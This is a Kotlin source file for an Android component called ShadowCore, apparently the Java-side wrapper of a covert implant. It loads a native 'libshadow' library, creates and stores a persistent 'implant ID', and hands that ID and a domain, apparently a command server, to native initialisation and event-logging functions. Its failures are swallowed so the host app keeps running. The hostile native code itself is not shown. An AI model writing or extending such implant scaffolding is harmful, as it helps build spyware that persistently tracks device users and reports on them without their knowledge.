package com.shadow

import android.content.Context
import android.util.Log
import java.util.UUID

object ShadowCore {
    private const val TAG = "ShadowCore"
    
    init {
        try {
            System.loadLibrary("shadow")
        } catch (e: Throwable) {
            // UnsatisfiedLinkError is an Error, not Exception — must not kill the process
            Log.e(TAG, "Failed to load libshadow.so", e)
        }
    }

    // Native functions — keep externals private; public wrappers never throw
    private external fun nativeInit(domain: String, implantId: String): Int
    private external fun nativeLogEvent(entry: String)

    fun logEvent(entry: String) {
        try {
            nativeLogEvent(entry)
        } catch (e: Throwable) {
            Log.e(TAG, "logEvent unavailable", e)
        }
    }

    fun start(context: Context, domain: String) {
        // Generate or retrieve persistent implant ID
        val prefs = context.getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
        var implantId = prefs.getString("implant_id", null)
        
        if (implantId == null) {
            implantId = UUID.randomUUID().toString()
            prefs.edit().putString("implant_id", implantId).apply()
        }

        Log.i(TAG, "Starting ShadowCore... ID: $implantId")
        try {
            val res = nativeInit(domain, implantId)
            if (res != 0) {
                Log.e(TAG, "nativeInit failed with code $res")
            }
        } catch (e: Throwable) {
            Log.e(TAG, "nativeInit unavailable (native lib missing?)", e)
        }
    }
}
